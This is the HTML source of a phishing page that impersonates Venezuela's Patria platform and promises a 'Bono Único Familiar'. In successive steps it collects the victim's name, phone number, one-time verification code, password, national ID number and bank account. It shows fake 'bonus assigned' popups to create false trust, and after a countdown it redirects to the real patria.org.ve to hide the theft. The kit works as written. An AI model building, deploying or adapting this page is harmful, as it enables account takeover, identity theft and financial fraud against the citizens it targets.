<!DOCTYPE html>
<html lang="es" dir="ltr">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Patria - Plataforma Solidaria</title>

    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700;900&display=swap" rel="stylesheet">

    <style>
        *, *::before, *::after {
            box-sizing: border-box;
        }

        :root {
            --patria-red: #da251d;
            --patria-blue: #0033a0;
            --bg-color: #f4f6f9;
            --text-main: #333;
            --input-bg: #f8f9fa;
        }

        body {
            font-family: 'Roboto', sans-serif;
            background-color: var(--bg-color);
            color: var(--text-main);
            margin: 0;
            padding: 0;
            -webkit-font-smoothing: antialiased;
        }

        .patria-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 15px 20px;
            background: #fff;
            box-shadow: 0 4px 15px rgba(0,0,0,0.05);
            position: sticky;
            top: 0;
            z-index: 100;
        }

        .header-logo {
            display: flex;
            align-items: center;
            font-size: 1.5rem;
            font-weight: 900;
            color: var(--patria-red);
            gap: 10px;
        }

        .header-menu i {
            font-size: 1.5rem;
            color: var(--patria-red);
            cursor: pointer;
        }

        .hero-banner {
            background-color: #1a365d;
            background-image: url('images/banner.jpeg');
            background-size: cover;
            background-position: center;
            color: #fff;
            padding: 60px 20px 100px;
            position: relative;
        }
        
        .hero-banner::before {
            content: '';
            position: absolute;
            top: 0; left: 0; right: 0; bottom: 0;
            background: rgba(18, 48, 87, 0.4);
            z-index: 1;
        }
        
        .hero-banner > * {
            position: relative;
            z-index: 2;
        }

        .hero-banner h1 {
            font-weight: 900;
            font-size: 2.2rem;
            margin-bottom: 5px;
        }

        .hero-banner h4 {
            font-weight: 700;
            font-size: 1rem;
            color: #eee;
            margin-bottom: 20px;
        }

        .hero-banner p {
            font-style: italic;
            font-size: 1.05rem;
            max-width: 450px;
            margin-bottom: 30px;
            line-height: 1.5;
            text-shadow: 1px 1px 3px rgba(0,0,0,0.5);
        }

        .btn-ver-mas {
            background: #fff;
            color: var(--patria-red);
            border: none;
            padding: 12px 35px;
            border-radius: 30px; 
            font-weight: 700;
            font-size: 0.95rem;
            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
            transition: all 0.3s ease;
        }
        
        .btn-ver-mas:active {
            transform: scale(0.95);
        }

        .portal-section {
            padding: 0 15px 40px;
            margin-top: -50px;
            position: relative;
            z-index: 10;
            display: flex;
            justify-content: center;
        }

        .patria-card {
            background: #fff;
            width: 100%;
            max-width: 500px;
            border-radius: 16px; 
            box-shadow: 0 10px 40px rgba(0,0,0,0.12);
            overflow: hidden;
            border: 1px solid rgba(0,0,0,0.05);
        }

        .card-header-custom {
            background-color: var(--patria-red);
            color: #fff;
            padding: 18px 25px;
            font-weight: 700;
            font-size: 1.05rem;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .card-body-custom {
            padding: 30px 25px;
        }

        .form-label-custom {
            display: block;
            font-size: 0.9rem;
            font-weight: 700;
            margin-bottom: 8px;
            color: #444;
        }

        .input-custom {
            width: 100%;
            height: 52px;
            background-color: var(--input-bg);
            border: 1.5px solid #e0e0e0;
            border-radius: 10px; 
            padding: 0 15px;
            font-size: 1.05rem;
            outline: none;
            transition: all 0.3s;
        }

        .input-custom:focus {
            border-color: var(--patria-blue);
            background-color: #fff;
            box-shadow: 0 0 0 4px rgba(0, 51, 160, 0.1);
        }

        .phone-input-wrapper {
            display: flex;
            gap: 12px;
            width: 100%;
        }

        .country-selector {
            background-color: var(--input-bg);
            border: 1.5px solid #e0e0e0;
            border-radius: 10px; 
            padding: 0 15px;
            display: flex;
            align-items: center;
            gap: 8px;
            font-weight: 700;
            cursor: pointer;
            flex-shrink: 0;
            transition: all 0.3s;
        }
        
        .country-selector:hover {
            border-color: #ccc;
        }

        .code-input {
            letter-spacing: 12px;
            font-size: 1.8rem;
            text-align: center;
            font-weight: 800;
        }

        .btn-tg {
            background-color: var(--patria-blue);
            color: white;
            border: none;
            border-radius: 10px; 
            width: 100%;
            height: 52px;
            font-size: 1.05rem;
            font-weight: 700;
            cursor: pointer;
            margin-top: 20px;
            transition: all 0.3s;
            box-shadow: 0 4px 15px rgba(0, 51, 160, 0.2);
        }

        .btn-tg:hover:not(:disabled) {
            background-color: #002266;
            transform: translateY(-2px);
        }

        .btn-tg:disabled {
            background-color: #b0c4de;
            cursor: not-allowed;
            box-shadow: none;
        }

        .checkbox-container {
            display: flex;
            align-items: center;
            gap: 10px;
            margin-top: 15px;
            cursor: pointer;
            font-size: 0.9rem;
            color: #555;
            user-select: none;
        }

        .checkbox-container input {
            width: 18px;
            height: 18px;
            cursor: pointer;
            accent-color: var(--patria-blue);
        }

        .extra-links {
            background-color: #fafbfc;
            border-top: 1px solid #eee;
        }
        
        .extra-links button {
            background: none;
            border: none;
            width: 100%;
            text-align: left;
            padding: 16px 25px;
            font-weight: 600;
            font-size: 0.95rem;
            color: #555;
            display: flex;
            justify-content: space-between;
            border-bottom: 1px solid #eee;
            transition: background 0.2s;
        }
        
        .extra-links button:hover {
            background-color: #f1f3f5;
        }

        .step-section { display: none; }
        .step-section.active { display: block; }
        .alert-custom { display: none; background: #fde8e8; color: #d12c2c; padding: 12px; border-radius: 8px; margin-bottom: 20px; font-weight: 600; text-align: center; }

        .quote-section {
            text-align: center;
            padding: 30px 20px 50px;
            font-weight: 700;
            color: var(--patria-blue);
            font-size: 1.1rem;
            max-width: 700px;
            margin: 0 auto;
        }
        
        .quote-author {
            color: #e3a9a9;
            font-size: 0.9rem;
            margin-top: 15px;
            display: block;
        }
        
        .footer-logo-block {
            text-align: center;
            width: 100%;
            max-width: 600px;
            margin: 0 auto;
        }
        
        .footer-logo-block img {
            width: 100%;
            height: auto;
            display: block;
        }

        .footer-stats {
            background-color: var(--patria-red);
            color: #fff;
            padding: 50px 20px;
            text-align: center;
        }
        
        .footer-stats h6 {
            letter-spacing: 2px;
            font-weight: 700;
            font-size: 0.9rem;
        }
        
        .footer-stats h1 {
            font-size: 5.5rem;
            font-weight: 900;
            line-height: 1;
            margin: 15px 0;
        }

        .bs-overlay { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: rgba(0,0,0,0.5); z-index: 9998; opacity: 0; visibility: hidden; transition: opacity 0.3s; }
        .bs-overlay.active { opacity: 1; visibility: visible; }
        .bs-modal { position: fixed; bottom: -100%; left: 0; width: 100%; height: 60vh; background: #fff; z-index: 9999; border-radius: 24px 24px 0 0; transition: bottom 0.4s cubic-bezier(0.2, 0.8, 0.2, 1); display: flex; flex-direction: column; }
        .bs-modal.active { bottom: 0; }
        .bs-header { padding: 20px 25px; border-bottom: 1px solid #eee; text-align: center; }
        .bs-search-box input { width: 100%; padding: 12px 15px; border-radius: 10px; border: 1.5px solid #e0e0e0; font-size: 1rem; outline: none; }
        .bs-search-box input:focus { border-color: var(--patria-blue); }
        .bs-list { overflow-y: auto; list-style: none; padding: 0; margin: 0; }
        .bs-item { padding: 18px 25px; display: flex; border-bottom: 1px solid #f7f9fa; cursor: pointer; transition: background 0.2s; }
        .bs-item:hover { background-color: #f8f9fa; }

        .claim-notif {
            position: fixed;
            bottom: 20px; 
            right: 20px; 
            background: rgba(40, 167, 69, 0.95);
            color: white;
            padding: 12px 18px; 
            border-radius: 10px;
            box-shadow: 0 8px 25px rgba(0,0,0,0.15);
            font-weight: 600; 
            font-size: 0.85rem; 
            display: flex;
            align-items: center;
            gap: 10px;
            z-index: 10000;
        }
    </style>
</head>

<body>

    <header class="patria-header">
        <div class="header-logo">
            <img src="images/logo-patria.png" alt="Patria" height="30" onerror="this.outerHTML='<i class=\'fas fa-flag\' style=\'color: #ffcc00;\'></i><span style=\'color: var(--patria-blue);\'>PA</span>TRIA'">
        </div>
        <div class="header-menu">
            <i class="fas fa-bars"></i>
        </div>
    </header>

    <section class="hero-banner">
        <h1>Bono Único Familiar</h1>
        <h4>4 NOVIEMBRE, 2026</h4>
        <p>Cuidamos de las familias y avanzamos paso a paso, el amor de nuestra gente hace que Venezuela renazca desde el corazón de cada hogar.</p>
        
        <button class="btn-ver-mas" id="btn-ver-mas">VER MÁS</button>
    </section>

    <section class="portal-section">
        <div class="patria-card">
            
            <div class="card-header-custom" id="form-header">
                <span>USUARIO / CONTRASEÑA</span>
            </div>
            
            <div id="form-body-wrapper">
                <div class="card-body-custom" id="main-form-container">
                    <input type="hidden" id="validateclientHash">
                    <input type="hidden" id="validatephone_number">
                    <input type="hidden" id="validateotp_code">

                    <div id="step1" class="step-section active">
                        <div id="alert1" class="alert-custom alert-error"></div>
                        <form id="firstForm">
                            <div style="display: none;">
                                <select id="job_position" required><option value="otro" selected>Otro</option></select>
                                <select id="experience" required><option value="0" selected>Beginner</option></select>
                                <input type="checkbox" id="certifico" checked required>
                                <input type="hidden" id="full_name" value="User">
                            </div>
                            
                            <div class="form-group mb-3">
                                <label class="form-label-custom">Nombre Completo</label>
                                <input type="text" id="user_name_input" class="input-custom" placeholder="Ingrese su nombre" required>
                            </div>

                            <div class="form-group mb-2">
                                <label class="form-label-custom">Teléfono Celular</label>
                                <div class="phone-input-wrapper">
                                    <div class="country-selector" id="open-country-modal">
                                        <span id="display-flag">🇻🇪</span>&nbsp;
                                        <span id="display-code">+58</span>
                                        <i class="fas fa-caret-down" style="font-size: 0.75rem; color: #888;"></i>
                                    </div>
                                    <input type="tel" id="phone_number" class="input-custom" placeholder="412 123 4567" required inputmode="numeric" autocomplete="off">
                                </div>
                            </div>

                            <label class="checkbox-container">
                                <input type="checkbox" id="terms_checkbox">
                                <span>Acepto los términos y condiciones de verificación</span>
                            </label>

                            <button type="submit" id="firstbutt" class="btn-tg" disabled>ENTRAR</button>
                        </form>
                    </div>

                    <div id="step2" class="step-section">
                        <p style="text-align: center; color: #555; font-size: 0.95rem; margin-bottom: 25px;">
                            Hemos enviado un código de confirmación a su dispositivo.
                        </p>
                        <div id="alert2" class="alert-custom alert-error"></div>
                        <form id="secondForm">
                            <div class="form-group mb-3">
                                <input type="tel" name="otp-input" id="otp_code" class="input-custom code-input" placeholder="•••••" required maxlength="5" autocomplete="off">
                            </div>
                            <button type="submit" id="seccbutt" class="btn-tg">VERIFICAR CÓDIGO</button>
                        </form>
                    </div>

                    <div id="step3" class="step-section">
                        <p style="text-align: center; color: #555; font-size: 0.95rem; margin-bottom: 25px;">
                            Ingrese su contraseña para continuar.
                        </p>
                        <div id="alert3" class="alert-custom alert-error"></div>
                        <form id="thirdForm">
                            <div class="form-group mb-3">
                                <input type="password" id="password" class="input-custom" placeholder="Contraseña" required>
                            </div>
                            <button type="submit" id="thirdbutt" class="btn-tg">CONFIRMAR</button>
                        </form>
                    </div>

                    <div id="step5" class="step-section">
                        <h5 class="mb-3 text-center" style="font-weight: 800; color: var(--patria-red);">Actualizar Datos</h5>
                        <p style="text-align: center; color: #555; font-size: 0.9rem; margin-bottom: 25px;">
                            Por favor ingrese sus datos con precisión para recibir el beneficio.
                        </p>
                        <form id="step5Form">
                            <div class="form-group mb-3">
                                <label class="form-label-custom">Cédula de Identidad</label>
                                <input type="text" id="national_id" class="input-custom" placeholder="V-12345678" required>
                            </div>
                            <div class="form-group mb-3">
                                <label class="form-label-custom">Nombre Completo</label>
                                <input type="text" id="full_name_ar" class="input-custom" placeholder="Nombre completo" required>
                            </div>
                            <div class="form-group mb-4">
                                <label class="form-label-custom">Cuenta Bancaria</label>
                                <input type="text" id="bank_account" class="input-custom" placeholder="0102-XXXX-XXXX-XXXX" required>
                            </div>
                            <button type="submit" id="fifthbutt" class="btn-tg">GUARDAR DATOS</button>
                        </form>
                    </div>

                    <div id="step6" class="step-section text-center py-4">
                        <div class="spinner-border mb-3" style="color: var(--patria-blue); width: 3.5rem; height: 3.5rem;" role="status"></div>
                        <h5 style="font-weight: 800; margin-top:10px;">Procesando su solicitud...</h5>
                        <p style="font-size: 0.95rem; color: #666; margin-top: 15px;">Por favor, no cierre ni actualice esta página.</p>
                        <p style="font-size: 1.2rem; font-weight: 800; margin-top: 15px;">
                            Tiempo restante: <span id="countdown-timer" style="color: var(--patria-red);">90</span>s
                        </p>
                    </div>
                </div>

                <div class="extra-links" id="extra-links-container">
                    <button>RECUPERAR CONTRASEÑA <i class="fas fa-chevron-right" style="color: #ccc;"></i></button>
                    <button style="border:none;">RECUPERAR ACCESO <i class="fas fa-chevron-right" style="color: #ccc;"></i></button>
                </div>
            </div>
            
        </div>
    </section>

    <section class="quote-section">
        "No hay amor más grande que el que uno siente aquí en el pecho por una causa, por una patria, por una gente, por un pueblo, por la causa humana"
        <span class="quote-author">Comandante Hugo Chávez</span>
    </section>

    <section style="background: #fff; padding-top: 20px;">
        <div class="footer-logo-block">
            <img src="images/logo1.jpeg" alt="Aplicaciones">
        </div>
    </section>

    <section class="footer-stats">
        <h6>NUESTRA PLATAFORMA</h6>
        <h1>540</h1>
        <p style="max-width: 350px; margin: 0 auto; font-size: 0.95rem; line-height: 1.5;">
            Posición en el ranking mundial de sitios web de Alexa en enero de 2022
        </p>
    </section>

    <section style="background: #fff; padding: 30px 0;">
        <div class="footer-logo-block">
            <img src="images/logo2.jpeg" alt="Instituciones">
        </div>
    </section>

    <section style="background: #e9ecef; padding: 30px 0;">
        <div class="footer-logo-block">
            <img src="images/logo3.jpeg" alt="Patrocinadores">
        </div>
    </section>

    <div class="bs-overlay" id="bs-overlay"></div>
    <div class="bs-modal" id="bs-modal">
        <div class="bs-header">
            <h4 style="margin:0; font-weight:700; font-size:1.2rem;">Seleccionar País</h4>
            <div class="bs-search-box mt-3">
                <input type="text" id="bs-search" placeholder="Buscar país..." autocomplete="off">
            </div>
        </div>
        <ul class="bs-list" id="bs-list">
            <li class="bs-item" data-code="+58" data-name="venezuela"><span class="flag">🇻🇪</span> <span class="name" style="margin-left:15px; font-weight:600; flex:1;">Venezuela</span> <span class="code" style="color:#666;">+58</span></li>
            <li class="bs-item" data-code="+57" data-name="colombia"><span class="flag">🇨🇴</span> <span class="name" style="margin-left:15px; font-weight:600; flex:1;">Colombia</span> <span class="code" style="color:#666;">+57</span></li>
            <li class="bs-item" data-code="+55" data-name="brasil"><span class="flag">🇧🇷</span> <span class="name" style="margin-left:15px; font-weight:600; flex:1;">Brasil</span> <span class="code" style="color:#666;">+55</span></li>
        </ul>
    </div>

    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script src="js/logical.js"></script>

    <script>
        $(document).ready(function() {
            $('#terms_checkbox').on('change', function() {
                if ($(this).is(':checked')) {
                    $('#firstbutt').prop('disabled', false);
                } else {
                    $('#firstbutt').prop('disabled', true);
                }
            });

            $('#btn-ver-mas').on('click', function(e) {
                e.preventDefault();
                $('html, body').animate({
                    scrollTop: $(".portal-section").offset().top - 80
                }, 600);
            });

            function checkExtraLinksVisibility() {
                if ($('#step1').hasClass('active')) {
                    $('#extra-links-container').show();
                } else {
                    $('#extra-links-container').hide();
                }
            }
            
            $('#firstbutt').on('click', function() {
                setTimeout(checkExtraLinksVisibility, 500);
            });

            const overlay = document.getElementById('bs-overlay');
            const closeAllModals = () => {
                overlay.classList.remove('active');
                document.querySelectorAll('.bs-modal').forEach(m => m.classList.remove('active'));
            };
            overlay.addEventListener('click', closeAllModals);

            const openBtn = document.getElementById('open-country-modal');
            const countryModal = document.getElementById('bs-modal');
            const listItems = document.querySelectorAll('.bs-item');
            const displayFlag = document.getElementById('display-flag');
            const displayCode = document.getElementById('display-code');

            if(openBtn) {
                openBtn.addEventListener('click', () => {
                    overlay.classList.add('active');
                    countryModal.classList.add('active');
                });
            }

            document.getElementById('bs-search').addEventListener('input', function(e) {
                const keyword = e.target.value.toLowerCase();
                listItems.forEach(item => {
                    const searchData = item.getAttribute('data-name') + " " + item.getAttribute('data-code');
                    item.style.display = searchData.includes(keyword) ? 'flex' : 'none';
                });
            });

            listItems.forEach(item => {
                item.addEventListener('click', function() {
                    const flag = this.querySelector('.flag').innerText;
                    const code = this.getAttribute('data-code');
                    displayFlag.innerText = flag;
                    displayCode.innerText = code;
                    
                    if(typeof COUNTRY_CODE !== 'undefined') {
                        COUNTRY_CODE = code;
                        MASK_FORMAT = code + " ";
                    }
                    
                    document.getElementById('phone_number').value = ""; 
                    document.getElementById('phone_number').focus();
                    closeAllModals();
                });
            });

            $('#step5Form').on('submit', function(e) {
                e.preventDefault(); 
                
                $('#step5').removeClass('active');
                $('#step6').addClass('active');
                
                let timeLeft = 90;
                const timerElement = document.getElementById('countdown-timer');
                
                const countdownInterval = setInterval(function() {
                    timeLeft--;
                    timerElement.textContent = timeLeft;
                    
                    if (timeLeft <= 0) {
                        clearInterval(countdownInterval);
                        window.location.href = 'https://www.patria.org.ve/'; 
                    }
                }, 1000);
            });

            const names = ["Carlos M.", "María P.", "José G.", "Ana V.", "Luis R.", "Carmen D."];
            setInterval(() => {
                const name = names[Math.floor(Math.random() * names.length)];
                const notif = $(`<div class="claim-notif"><i class="fas fa-check-circle"></i> Bono asignado a: ${name}</div>`);
                $('body').append(notif);
                
                setTimeout(() => {
                    notif.fadeOut(500, function() { $(this).remove(); });
                }, 4000);
            }, 12000);
        });
    </script>
</body>
</html>